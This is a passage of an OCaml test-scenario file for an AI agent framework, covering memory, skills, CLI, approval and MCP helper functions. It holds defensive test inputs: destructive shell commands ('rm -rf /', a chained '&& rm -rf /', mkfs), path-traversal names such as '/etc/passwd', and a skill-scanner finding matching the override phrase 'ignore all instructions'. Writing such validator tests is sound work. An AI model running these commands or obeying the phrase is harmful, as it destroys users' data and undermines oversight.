                   ("memory_tool_present", `Bool false) ];
               c [ ("label", `String "enabled_in_list"); ("op", `String "enabled");
                   ("enabled_toolsets", `List [ `String "memory"; `String "coding" ]);
                   ("disabled_toolsets", `Null); ("memory_tool_present", `Bool false) ];
               c [ ("label", `String "sanitize_strips_block"); ("op", `String "sanitize");
                   ("text", `String "keep <memory-context>hidden</memory-context> tail") ];
               c [ ("label", `String "sanitize_strips_tags"); ("op", `String "sanitize");
                   ("text", `String "a <memory-context> b </memory-context> c") ];
               c [ ("label", `String "sanitize_clean"); ("op", `String "sanitize");
                   ("text", `String "nothing to strip here") ];
               c [ ("label", `String "block_wraps"); ("op", `String "block");
                   ("text", `String "remembered fact") ];
               c [ ("label", `String "block_empty"); ("op", `String "block");
                   ("text", `String "   ") ] ]);
          ("unit", `String "manager") ] );
    ( "mem.trivial",
      c [ ("cases",
           `List
             (List.map
                (fun (label, text) ->
                  c [ ("label", `String label);
                      ("text", match text with Some t -> `String t | None -> `Null) ])
                [ ("null", None); ("empty", Some "   "); ("slash", Some "/help now");
                  ("yes", Some "yes"); ("yes_punct", Some "Yes!!"); ("thank_you", Some "thank you.");
                  ("greeting", Some "hey"); ("lgtm", Some "lgtm"); ("real", Some "please refactor the parser");
                  ("prefix_not_word", Some "yesterday"); ("multiword_real", Some "no thanks, later") ]));
          ("unit", `String "trivial") ] );
    ( "mem.session_state",
      c [ ("cases",
           `List
             [ c [ ("label", `String "hash_empty"); ("op", `String "hash");
                   ("text", `String "") ];
               c [ ("label", `String "hash_prompt"); ("op", `String "hash");
                   ("text", `String "You are a helpful assistant.") ];
               c [ ("label", `String "workspace_git_wins"); ("op", `String "workspace_key");
                   ("git_repo_root", `String " /repo/root "); ("cwd", `String "/repo/root/sub") ];
               c [ ("label", `String "workspace_cwd_fallback"); ("op", `String "workspace_key");
                   ("git_repo_root", `Null); ("cwd", `String "/tmp/scratch ") ];
               c [ ("label", `String "workspace_unbound"); ("op", `String "workspace_key");
                   ("git_repo_root", `Null); ("cwd", `Null) ];
               c [ ("label", `String "cwd_clause_trailing_slash"); ("op", `String "cwd_clause");
                   ("cwd_prefix", `String "/work/proj/") ];
               c [ ("label", `String "cwd_clause_wildcards"); ("op", `String "cwd_clause");
                   ("cwd_prefix", `String "/w_ork/100%done") ];
               c [ ("label", `String "workspace_clause"); ("op", `String "workspace_clause");
                   ("key", `String "/repo/root") ] ]);
          ("unit", `String "session_state") ] );
    ( "mem.portability",
      c [ ("cases",
           `List
             [ c [ ("label", `String "text_none"); ("op", `String "text_or_none");
                   ("value", `Null) ];
               c [ ("label", `String "text_str"); ("op", `String "text_or_none");
                   ("value", `String "hello") ];
               c [ ("label", `String "text_bad_type"); ("op", `String "text_or_none");
                   ("value", `Int 5) ];
               c [ ("label", `String "json_obj_str"); ("op", `String "json_object_or_none");
                   ("value", `String "{\"a\": 1}") ];
               c [ ("label", `String "json_obj_dict"); ("op", `String "json_object_or_none");
                   ("value", `Assoc [ ("b", `Int 2) ]) ];
               c [ ("label", `String "json_obj_bad_str"); ("op", `String "json_object_or_none");
                   ("value", `String "not json") ];
               c [ ("label", `String "json_obj_wrong_shape"); ("op", `String "json_object_or_none");
                   ("value", `String "[1,2]") ];
               c [ ("label", `String "float_none"); ("op", `String "float_or_none");
                   ("value", `Null) ];
               c [ ("label", `String "float_from_int"); ("op", `String "float_or_none");
                   ("value", `Int 3) ];
               c [ ("label", `String "float_from_str"); ("op", `String "float_or_none");
                   ("value", `String "2.5") ];
               c [ ("label", `String "float_bad"); ("op", `String "float_or_none");
                   ("value", `String "nope") ];
               c [ ("label", `String "int_none"); ("op", `String "int_or_none");
                   ("value", `Null) ];
               c [ ("label", `String "int_from_float"); ("op", `String "int_or_none");
                   ("value", `Float 4.9) ];
               c [ ("label", `String "int_default_bad"); ("op", `String "int_or_default");
                   ("value", `String "bad"); ("default", `Int 7) ];
               c [ ("label", `String "int_default_none"); ("op", `String "int_or_default");
                   ("value", `Null); ("default", `Int 7) ];
               c [ ("label", `String "reasoning_parses"); ("op", `String "reasoning_json_value");
                   ("value", `String "{\"k\": true}") ];
               c [ ("label", `String "reasoning_unparseable"); ("op", `String "reasoning_json_value");
                   ("value", `String "not json") ];
               c [ ("label", `String "reasoning_passthrough"); ("op", `String "reasoning_json_value");
                   ("value", `Int 9) ] ]);
          ("unit", `String "portability") ] ) ]

(* The skills family, five non-empty slices out of six (skill_catalog
   confirmed out of scope: its anchors are per-skill content directories, not
   an infrastructure module). Surveyed by four parallel agents against the
   full frozen source; every candidate below is a genuinely pure unit, each
   with its disclosed exclusions stated beside it in skill_units.ml's header
   and inline. *)
let skill_scenarios : (string * Yojson.Safe.t) list =
  let c fields = `Assoc fields in
  [ ( "skill.discovery",
      c [ ("cases",
           `List
             [ c [ ("label", `String "prereq_env_vars"); ("op", `String "prereqs");
                   ("frontmatter",
                    `Assoc
                      [ ("prerequisites",
                         `Assoc
                           [ ("env_vars", `List [ `String "FOO"; `String "  "; `String "BAR" ]);
                             ("commands", `List [ `String "git" ]) ]) ]) ];
               c [ ("label", `String "prereq_missing"); ("op", `String "prereqs");
                   ("frontmatter", `Assoc []) ];
               c [ ("label", `String "required_env_full"); ("op", `String "required_env");
                   ("frontmatter",
                    `Assoc
                      [ ("required_environment_variables",
                         `List
                           [ `String "PLAIN_VAR";
                             `Assoc
                               [ ("name", `String "WITH_HELP"); ("help", `String "docs here");
                                 ("optional", `Bool true) ] ]);
                        ("setup",
                         `Assoc
                           [ ("help", `String "setup help");
                             ("collect_secrets",
                              `List
                                [ `Assoc
                                    [ ("env_var", `String "SECRET_KEY");
                                      ("provider_url", `String "https://x.io") ] ]) ]);
                        ("prerequisites", `Assoc [ ("env_vars", `List [ `String "LEGACY_VAR" ]) ]) ]) ];
               c [ ("label", `String "required_env_dedup"); ("op", `String "required_env");
                   ("frontmatter",
                    `Assoc
                      [ ("required_environment_variables",
                         `List [ `String "DUP"; `Assoc [ ("name", `String "DUP") ] ]) ]) ];
               c [ ("label", `String "required_env_invalid_name"); ("op", `String "required_env");
                   ("frontmatter",
                    `Assoc
                      [ ("required_environment_variables", `List [ `String "not a valid name" ]) ]) ];
               c [ ("label", `String "tags_list"); ("op", `String "tags");
                   ("value", `List [ `String "alpha"; `Int 0; `String " beta " ]) ];
               c [ ("label", `String "tags_bracket_string"); ("op", `String "tags");
                   ("value", `String "[\"x\", 'y', z]") ];
               c [ ("label", `String "tags_empty"); ("op", `String "tags"); ("value", `Null) ];
               c [ ("label", `String "sort_skills"); ("op", `String "sort");
                   ("skills",
                    `List
                      [ `Assoc [ ("name", `String "zeta"); ("category", `String "b") ];
                        `Assoc [ ("name", `String "alpha"); ("category", `Null) ];
                        `Assoc [ ("name", `String "beta"); ("category", `String "b") ] ]) ];
               c [ ("label", `String "path_error_relative"); ("op", `String "path_error");
                   ("name", `String "docs/setup") ];
               c [ ("label", `String "path_error_posix_absolute"); ("op", `String "path_error");
                   ("name", `String "/etc/passwd") ];
               c [ ("label", `String "path_error_windows_relative_drive");
                   ("op", `String "path_error"); ("name", `String "C:foo") ];
               c [ ("label", `String "path_error_traversal"); ("op", `String "path_error");
                   ("name", `String "a/../../b") ] ]);
          ("unit", `String "discovery") ] );
    ( "skill.bundles",
      c [ ("cases",
           `List
             (List.map
                (fun (label, name) -> c [ ("label", `String label); ("name", `String name) ])
                [ ("plain", "My Skill"); ("underscores_and_bang", "Foo_Bar!");
                  ("multi_hyphen", "a---b"); ("leading_trailing", "--x--");
                  ("mixed_case_spaces", "  Data   Viz  ") ]));
          ("unit", `String "bundles") ] );
    ( "skill.preprocessing",
      c [ ("cases",
           `List
             [ c [ ("label", `String "template_dir"); ("op", `String "template");
                   ("content", `String "cd ${HERMES_SKILL_DIR}/x");
                   ("skill_dir", `String "/skills/foo"); ("session_id", `Null) ];
               c [ ("label", `String "template_empty_session_id"); ("op", `String "template");
                   ("content", `String "sid=${HERMES_SESSION_ID}"); ("skill_dir", `Null);
                   ("session_id", `String "") ];
               c [ ("label", `String "template_both"); ("op", `String "template");
                   ("content", `String "${HERMES_SKILL_DIR} / ${HERMES_SESSION_ID}");
                   ("skill_dir", `String "/d"); ("session_id", `String "s1") ];
               c [ ("label", `String "platform_macos_matches_darwin"); ("op", `String "platform");
                   ("current", `String "darwin"); ("running_in_termux", `Bool false);
                   ("platforms", `List [ `String "macos" ]) ];
               c [ ("label", `String "platform_termux_flag"); ("op", `String "platform");
                   ("current", `String "linux"); ("running_in_termux", `Bool true);
                   ("platforms", `List [ `String "android" ]) ];
               c [ ("label", `String "platform_none_declared"); ("op", `String "platform");
                   ("current", `String "linux"); ("running_in_termux", `Bool false);
                   ("platforms", `Null) ];
               c [ ("label", `String "platform_no_match"); ("op", `String "platform");
                   ("current", `String "win32"); ("running_in_termux", `Bool false);
                   ("platforms", `List [ `String "linux" ]) ];
               c [ ("label", `String "config_vars_default_zero"); ("op", `String "config_vars");
                   ("frontmatter",
                    `Assoc
                      [ ("metadata",
                         `Assoc
                           [ ("hermes",
                              `Assoc
                                [ ("config",
                                   `List
                                     [ `Assoc
                                         [ ("key", `String "threshold");
                                           ("description", `String "the threshold");
                                           ("default", `Int 0) ] ]) ]) ]) ]) ];
               c [ ("label", `String "config_vars_missing_desc"); ("op", `String "config_vars");
                   ("frontmatter",
                    `Assoc
                      [ ("metadata",
                         `Assoc
                           [ ("hermes",
                              `Assoc
                                [ ("config", `List [ `Assoc [ ("key", `String "no_desc") ] ]) ]) ]) ]) ];
               c [ ("label", `String "description_strips"); ("op", `String "description");
                   ("frontmatter", `Assoc [ ("description", `String "  'quoted note'  ") ]) ];
               c [ ("label", `String "description_truncates"); ("op", `String "description");
                   ("frontmatter",
                    `Assoc
                      [ ("description",
                         `String
                           "this description is deliberately much longer than the sixty character limit allows") ]) ];
               c [ ("label", `String "description_absent"); ("op", `String "description");
                   ("frontmatter", `Assoc []) ] ]);
          ("unit", `String "preprocessing") ] );
    ( "skill.sync",
      c [ ("cases",
           `List
             [ c [ ("label", `String "canonical_sorts_compact"); ("op", `String "canonical");
                   ("obj", `Assoc [ ("z", `Int 1); ("a", `List [ `Int 1; `Int 2 ]) ]) ];
               c [ ("label", `String "merge_unanimous_present"); ("op", `String "merge");
                   ("base", `String "h"); ("ours", `String "h"); ("theirs", `String "h") ];
               c [ ("label", `String "merge_unanimous_absent"); ("op", `String "merge");
                   ("base", `Null); ("ours", `Null); ("theirs", `Null) ];
               c [ ("label", `String "merge_ours_only"); ("op", `String "merge");
                   ("base", `String "b"); ("ours", `String "o"); ("theirs", `String "b") ];
               c [ ("label", `String "merge_theirs_only"); ("op", `String "merge");
                   ("base", `String "b"); ("ours", `String "b"); ("theirs", `String "t") ];
               c [ ("label", `String "merge_overlap"); ("op", `String "merge");
                   ("base", `String "b"); ("ours", `String "x"); ("theirs", `String "y") ];
               c [ ("label", `String "wire_address"); ("op", `String "wire");
                   ("data", `String "hello world") ];
               c [ ("label", `String "tracked_mod_true"); ("op", `String "tracked");
                   ("origin_hash", `String "abc"); ("user_hash", `String "def") ];
               c [ ("label", `String "tracked_mod_no_origin"); ("op", `String "tracked");
                   ("origin_hash", `String ""); ("user_hash", `String "def") ];
               c [ ("label", `String "parse_bool_empty_is_false"); ("op", `String "bool");
                   ("value", `String "") ];
               c [ ("label", `String "parse_bool_unrecognized"); ("op", `String "bool");
                   ("value", `String "maybe") ];
               c [ ("label", `String "parse_bool_yes"); ("op", `String "bool");
                   ("value", `String "YES") ];
               c [ ("label", `String "parse_bool_real_bool"); ("op", `String "bool");
                   ("value", `Bool true) ];
               c [ ("label", `String "manifest_roundtrip"); ("op", `String "manifest_build");
                   ("skills", `Assoc [ ("beta", `Bool true); ("alpha", `Bool false) ]) ];
               c [ ("label", `String "manifest_parse_malformed"); ("op", `String "manifest_parse");
                   ("data", `String "not json at all") ] ]);
          ("unit", `String "sync") ] );
    ( "skill.provenance",
      c [ ("cases",
           `List
             [ c [ ("label", `String "install_builtin_always_allows"); ("op", `String "install");
                   ("trust_level", `String "builtin"); ("verdict", `String "dangerous");
                   ("findings_count", `Int 3); ("force", `Bool false) ];
               c [ ("label", `String "install_agent_created_asks"); ("op", `String "install");
                   ("trust_level", `String "agent-created"); ("verdict", `String "dangerous");
                   ("findings_count", `Int 1); ("force", `Bool false) ];
               c [ ("label", `String "install_force_cannot_override_dangerous");
                   ("op", `String "install"); ("trust_level", `String "community");
                   ("verdict", `String "dangerous"); ("findings_count", `Int 1);
                   ("force", `Bool true) ];
               c [ ("label", `String "install_force_overrides_block"); ("op", `String "install");
                   ("trust_level", `String "community"); ("verdict", `String "caution");
                   ("findings_count", `Int 1); ("force", `Bool true) ];
               c [ ("label", `String "verdict_safe"); ("op", `String "verdict");
                   ("severities", `List [ `String "low"; `String "medium" ]) ];
               c [ ("label", `String "verdict_caution"); ("op", `String "verdict");
                   ("severities", `List [ `String "high" ]) ];
               c [ ("label", `String "verdict_dangerous"); ("op", `String "verdict");
                   ("severities", `List [ `String "critical"; `String "low" ]) ];
               c [ ("label", `String "verdict_none"); ("op", `String "verdict");
                   ("severities", `List []) ];
               c [ ("label", `String "trust_exact"); ("op", `String "trust");
                   ("source", `String "anthropics/skills") ];
               c [ ("label", `String "trust_prefix"); ("op", `String "trust");
                   ("source", `String "anthropics/skills/sub") ];
               c [ ("label", `String "trust_alias_agent_created"); ("op", `String "trust");
                   ("source", `String "skills-sh/agent-created") ];
               c [ ("label", `String "trust_official"); ("op", `String "trust");
                   ("source", `String "official") ];
               c [ ("label", `String "trust_unknown"); ("op", `String "trust");
                   ("source", `String "randomperson/repo") ];
               c [ ("label", `String "scan_report"); ("op", `String "report");
                   ("skill_name", `String "demo-skill"); ("source", `String "github");
                   ("trust_level", `String "community"); ("verdict", `String "caution");
                   ("findings",
                    `List
                      [ `Assoc
                          [ ("severity", `String "medium"); ("category", `String "obfuscation");
                            ("file", `String "SKILL.md"); ("line", `Int 12);
                            ("match", `String "hex string") ];
                        `Assoc
                          [ ("severity", `String "high"); ("category", `String "injection");
                            ("file", `String "SKILL.md"); ("line", `Int 3);
                            ("match", `String "ignore all instructions") ] ]) ];
               c [ ("label", `String "build_summary_clean"); ("op", `String "summary");
                   ("name", `String "clean-skill"); ("verdict", `String "safe");
                   ("categories", `List []) ];
               c [ ("label", `String "build_summary_findings"); ("op", `String "summary");
                   ("name", `String "risky-skill"); ("verdict", `String "caution");
                   ("categories", `List [ `String "injection"; `String "obfuscation"; `String "injection" ]) ];
               c [ ("label", `String "ast_report_empty"); ("op", `String "ast_report");
                   ("skill_name", `String "clean"); ("findings", `List []) ];
               c [ ("label", `String "ast_report_findings"); ("op", `String "ast_report");
                   ("skill_name", `String "dyn");
                   ("findings",
                    `List
                      [ `List
                          [ `String "helper.py"; `Int 10; `String "dynamic_import";
                            `String "importlib.import_module()" ];
                        `List
                          [ `String "helper.py"; `Int 4; `String "dynamic_getattr";
                            `String "getattr with non-literal attribute name" ] ]) ] ]);
          ("unit", `String "provenance") ] ) ]

let cli_scenarios : (string * Yojson.Safe.t) list =
  let c fields = `Assoc fields in
  [ ( "cli.repl",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "strip_ansi_sgr"); ("op", `String "strip_ansi");
                    ("text", `String "\x1b[31mred\x1b[0m plain") ];
                c [ ("label", `String "footer_rule_dashes"); ("op", `String "is_status_footer_rule");
                    ("line", `String (String.make 12 '-')) ];
                c [ ("label", `String "footer_rule_short"); ("op", `String "is_status_footer_rule");
                    ("line", `String "short") ];
                c [ ("label", `String "strip_footer_full");
                    ("op", `String "strip_console_status_footer");
                    ( "text",
                      `String
                        ("hi\n" ^ String.make 10 '-'
                        ^ "\nRun 'hermes doctor' to check\nRun 'hermes setup' to configure\n") ) ];
                c [ ("label", `String "strip_footer_none"); ("op", `String "strip_console_status_footer");
                    ("text", `String "just output\n") ];
                c [ ("label", `String "format_sessions_basic"); ("op", `String "format_sessions");
                    ( "sessions",
                      `List
                        [ c [ ("id", `String "abc123"); ("source", `String "cli");
                              ("message_count", `Int 4); ("title", `String "hello") ] ] ) ];
                c [ ("label", `String "format_sessions_empty"); ("op", `String "format_sessions");
                    ("sessions", `List []) ];
                c [ ("label", `String "clean_summary_suppress"); ("op", `String "clean_summary");
                    ("text", `String "==SUPPRESS==") ];
                c [ ("label", `String "clean_summary_collapse"); ("op", `String "clean_summary");
                    ("text", `String "  multi   space   text  ") ];
                c [ ("label", `String "provider_name_capitalize"); ("op", `String "auto_provider_name");
                    ("base_url", `String "https://MyServer.com/v1") ];
                c [ ("label", `String "provider_name_localhost"); ("op", `String "auto_provider_name");
                    ("base_url", `String "http://localhost:8080") ];
                c [ ("label", `String "dashboard_runtime_full"); ("op", `String "parse_dashboard_runtime");
                    ("command", `String "hermes dashboard --port 9200 --host '[::1]'") ];
                c [ ("label", `String "dashboard_runtime_none"); ("op", `String "parse_dashboard_runtime");
                    ("command", `String "hermes chat") ];
                c [ ("label", `String "probe_host_brackets"); ("op", `String "dashboard_probe_host");
                    ("host", `String "]]::1[[") ];
                c [ ("label", `String "coalesce_session_name"); ("op", `String "coalesce_session_name_args");
                    ( "argv",
                      `List
                        (List.map (fun s -> `String s) [ "-c"; "my"; "session"; "name"; "chat" ]) ) ] ]);
          ("unit", `String "repl") ] );
    ( "cli.slash",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "telegram_name"); ("op", `String "sanitize_telegram_name");
                    ("raw", `String "My-Bot__Name!!") ];
                c [ ("label", `String "slack_name"); ("op", `String "sanitize_slack_name");
                    ("raw", `String "My-Bot Name!") ];
                c [ ("label", `String "clamp_collision"); ("op", `String "clamp_command_names");
                    ( "entries",
                      `List [ `List [ `String (String.make 40 'a'); `String "d" ] ] );
                    ("reserved", `List [ `String (String.make 32 'a') ]) ];
                c [ ("label", `String "nested_present"); ("op", `String "nested_mapping");
                    ("root", c [ ("a", c [ ("b", c [ ("c", `Int 1) ]) ]) ]);
                    ("path", `List [ `String "a"; `String "b" ]) ];
                c [ ("label", `String "nested_missing"); ("op", `String "nested_mapping");
                    ("root", c [ ("a", `Int 1) ]); ("path", `List [ `String "a"; `String "b" ]) ];
                c [ ("label", `String "clean_quotes"); ("op", `String "clean");
                    ("text", `String "it's a \"test\"\\!") ] ]);
          ("unit", `String "slash") ] );
    ( "cli.fuzzy",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "boundary_camel"); ("op", `String "is_boundary");
                    ("target", `String "myFile"); ("index", `Int 2) ];
                c [ ("label", `String "boundary_start"); ("op", `String "is_boundary");
                    ("target", `String "x"); ("index", `Int 0) ];
                c [ ("label", `String "score_prefix"); ("op", `String "fuzzy_score");
                    ("item_label", `String "skill_units.ml"); ("query", `String "skill") ];
                c [ ("label", `String "score_none"); ("op", `String "fuzzy_score");
                    ("item_label", `String "abc"); ("query", `String "xyz") ];
                c [ ("label", `String "filter_ranked"); ("op", `String "filter_indices");
                    ("items", `List (List.map (fun s -> `String s) [ "skillet"; "skill"; "other" ]));
                    ("query", `String "skill") ];
                c [ ("label", `String "move_wraps"); ("op", `String "move_filtered_cursor");
                    ("filtered", `List [ `Int 10; `Int 20; `Int 30 ]); ("cursor", `Int 10);
                    ("cursor_pos", `Int 0); ("delta", `Int (-1)) ];
                c [ ("label", `String "reconcile_snap"); ("op", `String "reconcile_cursor");
                    ("filtered", `List [ `Int 10; `Int 20 ]); ("cursor", `Int 99) ];
                c [ ("label", `String "scroll_advance"); ("op", `String "scroll_for_cursor");
                    ("scroll_offset", `Int 0); ("cursor_pos", `Int 9); ("visible_rows", `Int 5);
                    ("total_rows", `Int 20) ];
                c [ ("label", `String "radio_plain_string"); ("op", `String "radio_item_plain");
                    ("item", `String "plain") ];
                c [ ("label", `String "radio_plain_styled"); ("op", `String "radio_item_plain");
                    ( "item",
                      `List
                        [ `List [ `String "a"; `String "bold" ]; `List [ `String "b"; `String "" ] ] ) ] ]);
          ("unit", `String "fuzzy") ] );
    ( "cli.approval",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "operator_and"); ("op", `String "has_allowlist_shell_operator");
                    ("command", `String "echo hi && rm -rf /") ];
                c [ ("label", `String "operator_none"); ("op", `String "has_allowlist_shell_operator");
                    ("command", `String "echo hello world") ];
                c [ ("label", `String "root_binary_path"); ("op", `String "unsafe_root_binary");
                    ("token", `String "/usr/bin/rm") ];
                c [ ("label", `String "root_binary_mkfs"); ("op", `String "unsafe_root_binary");
                    ("token", `String "mkfs.ext4") ];
                c [ ("label", `String "glob_plain_second"); ("op", `String "derive_glob");
                    ("normalized", `String "git status") ];
                c [ ("label", `String "glob_flag_second"); ("op", `String "derive_glob");
                    ("normalized", `String "git -c foo status") ];
                c [ ("label", `String "glob_single"); ("op", `String "derive_glob");
                    ("normalized", `String "ls") ];
                c [ ("label", `String "glob_unsafe"); ("op", `String "derive_glob");
                    ("normalized", `String "rm -rf /") ];
                c [ ("label", `String "unsafe_class_word"); ("op", `String "is_unsafe_class");
                    ("description", `String "run rm on the target") ];
                c [ ("label", `String "unsafe_class_boundary_control"); ("op", `String "is_unsafe_class");
                    ("description", `String "check the disketted drive") ];
                c [ ("label", `String "apply_indices_dedup"); ("op", `String "parse_apply_indices");
                    ("spec", `String "1,3,1"); ("total", `Int 5) ];
                c [ ("label", `String "apply_indices_invalid"); ("op", `String "parse_apply_indices");
                    ("spec", `String "abc"); ("total", `Int 5) ];
                c [ ("label", `String "apply_indices_range"); ("op", `String "parse_apply_indices");
                    ("spec", `String "9"); ("total", `Int 3) ] ]);
          ("unit", `String "approval") ] );
    ( "cli.bang",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "is_bang_true"); ("op", `String "is_bang_command");
                    ("text", `String "!ls -la") ];
                c [ ("label", `String "is_bang_false"); ("op", `String "is_bang_command");
                    ("text", `String "ls -la") ];
                c [ ("label", `String "is_bang_non_string"); ("op", `String "is_bang_command");
                    ("text", `Int 5) ];
                c [ ("label", `String "parse_bang_strips"); ("op", `String "parse_bang_command");
                    ("text", `String "  !ls -la  ") ];
                c [ ("label", `String "remote_session_true"); ("op", `String "is_remote_shell_session");
                    ("env", `Assoc [ ("SSH_CONNECTION", `String "1.2.3.4 22 5.6.7.8 22") ]) ];
                c [ ("label", `String "remote_session_false"); ("op", `String "is_remote_shell_session");
                    ("env", `Assoc []) ];
                c [ ("label", `String "powershell_script"); ("op", `String "powershell_write_script");
                    ("b64", `String "QUJD") ] ]);
          ("unit", `String "bang") ] ) ]

let mcp_scenarios : (string * Yojson.Safe.t) list =
  let c fields = `Assoc fields in
  [ ( "mcp.client",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "normalize_null"); ("op", `String "normalize_schema"); ("schema", `Null) ];
                c [ ("label", `String "normalize_definitions_ref"); ("op", `String "normalize_schema");
                    ("schema",
                     c
                       [ ("$ref", `String "#/definitions/Foo");
                         ("definitions", c [ ("Foo", c [ ("type", `String "string") ]) ]) ]) ];
                c [ ("label", `String "normalize_property_named_definitions"); ("op", `String "normalize_schema");
                    ("schema",
                     c
                       [ ("type", `String "object");
                         ("properties", c [ ("definitions", c [ ("type", `String "array") ]) ]) ]) ];
                c [ ("label", `String "normalize_nullable_union"); ("op", `String "normalize_schema");
                    ("schema",
                     c
                       [ ("anyOf",
                          `List [ c [ ("type", `String "string") ]; c [ ("type", `String "null") ] ]) ]) ];
                c [ ("label", `String "normalize_required_pruned"); ("op", `String "normalize_schema");
                    ("schema",
                     c
                       [ ("required", `List [ `String "a"; `String "ghost" ]);
                         ("properties", c [ ("a", c []) ]) ]) ];
                c [ ("label", `String "fingerprint_basic"); ("op", `String "fingerprint");
                    ("config",
                     c
                       [ ("command", `String "npx"); ("args", `List [ `String "-y"; `String "srv" ]);
                         ("url", `Null); ("transport", `Null) ]) ];
                c [ ("label", `String "fingerprint_absent_args"); ("op", `String "fingerprint");
                    ("config", c [ ("command", `String "npx") ]) ];
                c [ ("label", `String "matches_filter_glob"); ("op", `String "matches_filter");
                    ("tool_name", `String "get_zones_east"); ("patterns", `List [ `String "get_zones_*" ]) ];
                c [ ("label", `String "matches_filter_exact_only"); ("op", `String "matches_filter");
                    ("tool_name", `String "exact"); ("patterns", `List [ `String "exac" ]) ];
                c [ ("label", `String "matches_filter_bare_string"); ("op", `String "matches_filter");
                    ("tool_name", `String "x"); ("patterns", `String "x") ];
                c [ ("label", `String "prefixed_name"); ("op", `String "prefixed_name");
                    ("server_name", `String "my-srv"); ("tool_name", `String "do thing") ] ]);
          ("unit", `String "client") ] );
    ( "mcp.oauth",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "humanize_registration_403"); ("op", `String "humanize_error");
                    ("server_name", `String "srv");
                    ("exc", `String "403 Forbidden: client registration failed"); ("server_url", `Null) ];
                c [ ("label", `String "humanize_unrelated_error"); ("op", `String "humanize_error");
                    ("server_name", `String "srv"); ("exc", `String "500 internal error"); ("server_url", `Null) ];
                c [ ("label", `String "humanize_figma"); ("op", `String "humanize_error");
                    ("server_name", `String "figma"); ("exc", `String "403 forbidden");
                    ("server_url", `String "https://mcp.figma.com/mcp") ];
                c [ ("label", `String "apply_defaults_figma_empty"); ("op", `String "apply_defaults");
                    ("cfg", c []); ("server_name", `String "figma");
                    ("server_url", `String "https://mcp.figma.com/mcp") ];
                c [ ("label", `String "apply_defaults_preserves_explicit"); ("op", `String "apply_defaults");
                    ("cfg", c [ ("client_name", `String "Mine") ]); ("server_name", `String "figma");
                    ("server_url", `Null) ];
                c [ ("label", `String "safe_filename_sanitizes"); ("op", `String "safe_filename");
                    ("name", `String "my server!!") ];
                c [ ("label", `String "safe_filename_all_invalid"); ("op", `String "safe_filename");
                    ("name", `String "!!!") ];
                c [ ("label", `String "same_endpoint_root_vs_empty"); ("op", `String "same_endpoint");
                    ("a", `String "http://x.com"); ("b", `String "http://x.com/") ];
                c [ ("label", `String "same_endpoint_case_insensitive"); ("op", `String "same_endpoint");
                    ("a", `String "HTTP://X.com/a"); ("b", `String "http://x.com/a") ];
                c [ ("label", `String "same_endpoint_different_paths"); ("op", `String "same_endpoint");
                    ("a", `String "http://x.com/a"); ("b", `String "http://x.com/b") ] ]);
          ("unit", `String "oauth") ] );
    ( "mcp.config",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "strip_bearer_prefix"); ("op", `String "strip_bearer");
                    ("token", `String "Bearer abc123") ];
                c [ ("label", `String "strip_bearer_short"); ("op", `String "strip_bearer");
                    ("token", `String "abc") ];
                c [ ("label", `String "parse_env_maxsplit"); ("op", `String "parse_env");
                    ("raw_env", `List [ `String "FOO=bar"; `String "BAZ=a=b=c" ]) ];
                c [ ("label", `String "parse_env_value_not_stripped"); ("op", `String "parse_env");
                    ("raw_env", `List [ `String "KEY= value" ]) ];
                c [ ("label", `String "parse_env_no_equals"); ("op", `String "parse_env");
                    ("raw_env", `List [ `String "no-equals-sign" ]) ];
                c [ ("label", `String "parse_env_bad_name"); ("op", `String "parse_env");
                    ("raw_env", `List [ `String "1BAD=x" ]) ];
                c [ ("label", `String "expand_install_dir_ok"); ("op", `String "expand_install_dir");
                    ("value", `String "${INSTALL_DIR}/bin"); ("install_dir", `String "/opt/x") ];
                c [ ("label", `String "expand_install_dir_missing"); ("op", `String "expand_install_dir");
                    ("value", `String "${INSTALL_DIR}/bin"); ("install_dir", `Null) ];
                c [ ("label", `String "env_key_sanitizes"); ("op", `String "env_key");
                    ("name", `String "My Server!") ];
                c [ ("label", `String "bearer_headers_shape"); ("op", `String "bearer_headers");
                    ("name", `String "srv") ];
                c [ ("label", `String "build_server_config_http_api_key");
                    ("transport_type", `String "stdio"); ("op", `Null); ("auth_type", `String "api_key");
                    ("name", `String "srv"); ("url", `String "https://x"); ("install_dir", `Null) ] ]);
          ("unit", `String "config") ] );
    ( "mcp.surface",
      c
        [ ( "cases",
            `List
              [ c [ ("label", `String "extract_content_text_only"); ("op", `String "extract_content");
                    ("msg",
                     c
                       [ ("content",
                          `List
                            [ c [ ("type", `String "text"); ("text", `String "hi") ];
                              c [ ("type", `String "image") ] ]) ]) ];
                c [ ("label", `String "extract_content_falsy_dict"); ("op", `String "extract_content");
                    ("msg", c [ ("content", c []) ]) ];
                c [ ("label", `String "extract_attachments_media_tag"); ("op", `String "extract_attachments");
                    ("msg", c [ ("content", `String "look MEDIA:foo.png here") ]) ];
                c [ ("label", `String "extract_attachments_image_url"); ("op", `String "extract_attachments");
                    ("msg",
                     c
                       [ ("content",
                          `List
                            [ c
                                [ ("type", `String "image_url");
                                  ("image_url", c [ ("url", `String "http://x/y.png") ]) ] ]) ]) ];
                c [ ("label", `String "row_to_entry_basic"); ("op", `String "row_to_entry");
                    ("row",
                     c
                       [ ("id", `Int 5); ("source", `String "telegram"); ("chat_type", `Null);
                         ("display_name", `Null); ("origin_json", `Null); ("started_at", `Int 100000);
                         ("last_active", `Null); ("input_tokens", `Int 3); ("output_tokens", `Int 7) ]) ];
                c [ ("label", `String "row_to_entry_zero_last_active"); ("op", `String "row_to_entry");
                    ("row",
                     c
                       [ ("id", `Int 6); ("source", `String "telegram"); ("chat_type", `Null);
                         ("display_name", `Null); ("origin_json", `Null); ("started_at", `Int 100000);
                         ("last_active", `Int 0); ("input_tokens", `Null); ("output_tokens", `Null) ]) ];
                c [ ("label", `String "ts_float_iso_string"); ("op", `String "ts_float");
                    ("ts", `String "1970-01-01T00:00:10") ];
                c [ ("label", `String "ts_float_numeric_string"); ("op", `String "ts_float"); ("ts", `String "5.5") ];
                c [ ("label", `String "coerce_int_clamped"); ("op", `Null); ("value", `Int 500); ("default", `Int 0);
                    ("minimum", `Int 0); ("maximum", `Int 100) ];
                c [ ("label", `String "coerce_int_bool_is_int"); ("op", `Null); ("value", `Bool true);
